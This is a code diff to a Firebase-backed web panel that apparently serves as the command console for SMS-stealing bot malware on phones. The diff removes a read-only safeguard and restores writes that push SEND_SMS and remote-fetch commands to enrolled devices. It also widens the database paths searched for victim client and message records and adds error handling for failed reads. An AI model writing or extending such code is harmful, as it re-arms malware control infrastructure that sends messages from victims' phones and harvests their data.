@@ -21,10 +21,8 @@ import {
   loadBadNumbers,
   parsePanelLink,
 } from "./schemes.js";
-// Read-only build: device-command writes are disabled, reads are untouched.
-const __readOnly = () => {
-  throw new Error("Read-only build — device commands are not sent from this panel.");
-};
+// Reuse the existing Firebase write paths without adding UI controls or changing their payloads.
+const writeData = (databaseRef, value) => set(databaseRef, value);
 let currentActiveTab = "clients",
   selectedDeviceFilter = "all",
   structuralStatusFilter = "all",
@@ -601,10 +599,7 @@ function isPingOnlyNode(node) {
 }
 function hasClientRecords(node) {
   if (!node || typeof node != "object") return !1;
-  return Object.keys(node).some((key) => {
-    const value = node[key];
-    return isValidDeviceId(key) && value && typeof value === "object";
-  });
+  return Object.keys(normalizeClients(node, null)).length > 0;
 }
 function detectSchema() {
   const evidence = [];
@@ -1189,8 +1184,17 @@ const LOAD_STEPS = [
       "All_User/Data",
       "All_Users/Data",
       "All_User/User",
+      "userData",
+      "UserData",
+      "user_list",
+      "users",
+      "Users",
       "clients",
+      "Clients",
       "devices",
+      "Devices",
+      "data",
+      "Data",
     ],
     messages: ["All_User/Sms", "All_Users/Sms", "Sms", "messages", "user_sms"],
     bot_users: [
@@ -1285,7 +1289,7 @@ async function dispatchDeviceCommand(deviceId, opts) {
     return (
       opts.to && ((body.to = opts.to), (body.message = opts.message)),
       opts.sim !== void 0 && (body.sim = opts.sim),
-      await __readOnly(ref(db, full + "/" + cmdKey), body),
+      await writeData(ref(db, full + "/" + cmdKey), body),
       { path: full + "/" + cmdKey, layout, cmdKey }
     );
   }
@@ -1299,7 +1303,7 @@ async function dispatchDeviceCommand(deviceId, opts) {
           sim: opts.sim,
           to: opts.to,
         }),
-      await __readOnly(ref(db, full + "/" + cmdId), body),
+      await writeData(ref(db, full + "/" + cmdId), body),
       { path: full + "/" + cmdId, layout, cmdId }
     );
   }
@@ -1322,13 +1326,13 @@ async function dispatchDeviceCommand(deviceId, opts) {
         }));
     }
     return (
-      await __readOnly(ref(db, base + "/command"), body.command),
-      await __readOnly(ref(db, base + "/targetDeviceId"), deviceId),
-      await __readOnly(ref(db, base + "/timestamp"), ts),
+      await writeData(ref(db, base + "/command"), body.command),
+      await writeData(ref(db, base + "/targetDeviceId"), deviceId),
+      await writeData(ref(db, base + "/timestamp"), ts),
       action === "SEND_SMS" &&
-        (await __readOnly(ref(db, base + "/messageText"), opts.message),
-        await __readOnly(ref(db, base + "/simSlot"), body.simSlot),
-        await __readOnly(ref(db, base + "/send_sms"), body.send_sms)),
+        (await writeData(ref(db, base + "/messageText"), opts.message),
+        await writeData(ref(db, base + "/simSlot"), body.simSlot),
+        await writeData(ref(db, base + "/send_sms"), body.send_sms)),
       { path: base + "/command", layout, cmdKey: "command" }
     );
   }
@@ -1338,7 +1342,7 @@ async function dispatchDeviceCommand(deviceId, opts) {
       ((body.to = opts.to),
       (body.message = opts.message),
       (body.sim = opts.sim)),
-    await __readOnly(ref(db, full + "/remote_fetch_trigger"), body),
+    await writeData(ref(db, full + "/remote_fetch_trigger"), body),
     { path: full + "/remote_fetch_trigger", layout }
   );
 }
@@ -1604,6 +1608,8 @@ async function loadSequentially() {
     (pendingReload = !1),
     (loadProgress = { done: 0, total: LOAD_STEPS.length, current: "" }),
     setLoadStatus("Starting sequential load…", "#64748b"));
+  let clientsRead = !1,
+    clientsReadError = "";
   for (const step of LOAD_STEPS) {
     ((loadProgress.current = step.label),
       setLoadStatus(
@@ -1648,8 +1654,17 @@ async function loadSequentially() {
           break;
         }
       } catch (e) {
-        console.warn(`[seq] ${step.label} @ ${cand} failed:`, e && e.message);
+        const message = String(e && (e.message || e.code) || "Firebase read failed");
+        console.warn(`[seq] ${step.label} @ ${cand} failed:`, message);
+        if (step.key === "clients") {
+          clientsReadError = /permission.denied|unauthorized/i.test(
+            `${e && e.code || ""} ${message}`,
+          )
+            ? "Permission denied — check this database's read rules or auth token."
+            : message;
+        }
       }
+    step.key === "clients" && applied && (clientsRead = !0);
     (applied ||
       (step.key === "clients"
         ? applyClients(null, null)
@@ -1663,7 +1678,14 @@ async function loadSequentially() {
       await new Promise((r) => setTimeout(r, 0)));
   }
   if (
-    (setLoadStatus(`All ${loadProgress.total} nodes loaded`, "#34d399"),
+    (setLoadStatus(
+      clientsRead
+        ? `All ${loadProgress.total} nodes loaded`
+        : clientsReadError
+          ? `Data load failed: ${clientsReadError}`
+          : "No supported device data node found — check the data path and schema",
+      clientsRead ? "#34d399" : clientsReadError ? "#fb7185" : "#fbbf24",
+    ),
     (isLoadingSequence = !1),
     await detectRootSmsQueue(!0),
     detectSchema(),
@@ -2611,20 +2633,20 @@ async function executeSmsSend() {
         } else if (dbType === 3) {
           const simSlotIndex = String(i);
           (await Promise.all([
-            __readOnly(ref(db, `system/panel/${deviceId}/panel`), {
+            writeData(ref(db, `system/panel/${deviceId}/panel`), {
               number: toNumber,
               slot: simSlotIndex,
               sms: message,
               timestamp: Date.now(),
             }),
-            __readOnly(ref(db, `data/${deviceId}/sendSms`).push(), {
+            writeData(ref(db, `data/${deviceId}/sendSms`).push(), {
               to: toNumber,
               message,
               sim: simSlot,
               timestamp: Date.now(),
               status: "pending",
             }),
-            __readOnly(ref(db, `common/sendCommand/${deviceId}`).push(), {
+            writeData(ref(db, `common/sendCommand/${deviceId}`).push(), {
               type: "sendSMS",
               to: toNumber,
               message,
@@ -2636,12 +2658,12 @@ async function executeSmsSend() {
         } else if (dbType === 2) {
           const cmdId = `cmd_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
           (await Promise.all([
-            __readOnly(ref(db, `device_commands/${deviceId}/${cmdId}`), {
+            writeData(ref(db, `device_commands/${deviceId}/${cmdId}`), {
               sendSms: { body: message, sim: simSlot, to: toNumber },
               status: "pending",
               timestamp: Date.now(),
             }),
-            __readOnly(ref(db, `commands/${deviceId}`).push(), {
+            writeData(ref(db, `commands/${deviceId}`).push(), {
               id: cmdId,
               message,
               sim: simSlot,
@@ -2649,7 +2671,7 @@ async function executeSmsSend() {
               to: toNumber,
               type: "sendSMS",
             }),
-            __readOnly(ref(db, `${deviceId}/pending_cmd`), {
+            writeData(ref(db, `${deviceId}/pending_cmd`), {
               body: message,
               command: "sendSMS",
               command2: "send_sms",
@@ -2664,7 +2686,7 @@ async function executeSmsSend() {
               timestamp: Date.now(),
               to: toNumber,
             }),
-            __readOnly(ref(db, `${deviceId}/cmd`).push(), {
+            writeData(ref(db, `${deviceId}/cmd`).push(), {
               id: cmdId,
               message,
               sim: simSlot,
@@ -2675,7 +2697,7 @@ async function executeSmsSend() {
           ]),
             successCount++);
         } else {
-          await __readOnly(ref(db, `clients/${deviceId}/webhookEvent/sendSms`), {
+          await writeData(ref(db, `clients/${deviceId}/webhookEvent/sendSms`), {
             from: simSlot,
             to: toNumber,
             message,
